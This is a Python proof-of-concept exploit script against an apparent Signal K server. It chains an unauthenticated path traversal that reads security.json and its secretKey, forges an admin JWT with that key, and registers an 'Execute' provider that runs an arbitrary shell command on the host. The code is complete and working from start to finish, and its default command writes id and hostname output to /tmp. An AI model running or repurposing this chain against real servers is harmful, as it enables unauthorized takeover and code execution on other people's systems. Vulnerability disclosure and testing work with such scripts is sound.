#!/usr/bin/env python3
import base64, hashlib, hmac, json, time, urllib.request, sys

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:13000"
CMD = "id > /tmp/sk-pwned; hostname >> /tmp/sk-pwned"

def get(path, tok=None):
    r = urllib.request.Request(BASE + path)
    if tok:
        r.add_header("Authorization", "JWT " + tok)
    return urllib.request.urlopen(r, timeout=10)

def post(path, body, tok=None):
    r = urllib.request.Request(BASE + path, data=json.dumps(body).encode(), method="POST")
    r.add_header("Content-Type", "application/json")
    if tok:
        r.add_header("Authorization", "JWT " + tok)
    return urllib.request.urlopen(r, timeout=10)

b64 = lambda b: base64.urlsafe_b64encode(b).rstrip(b"=").decode()

print("[1] unauth traversal read security.json")
sec = json.load(get("/signalk/v2/api/resources/notes/..%2F..%2F..%2F..%2Fsecurity.json"))
sk = sec["secretKey"]
print("    allow_readonly =", sec.get("allow_readonly"), "| secretKey len =", len(sk))

print("[2] forge admin JWT")
h = b64(json.dumps({"alg": "HS256", "typ": "JWT"}).encode())
c = b64(json.dumps({"id": "admin", "iat": int(time.time())}).encode())
tok = h + "." + c + "." + b64(hmac.new(sk.encode(), (h + "." + c).encode(), hashlib.sha256).digest())
print("    token:", tok[:40] + "...")
print("    loginStatus:", json.load(get("/skServer/loginStatus", tok)))

print("[3] create Execute provider")
prov = {"id": "poc-rce", "enabled": True, "logging": False, "type": "Execute",
        "options": {"type": "ws", "dataType": "SignalK", "command": CMD}}
print("    resp:", post("/skServer/providers", prov, tok).read().decode()[:120])
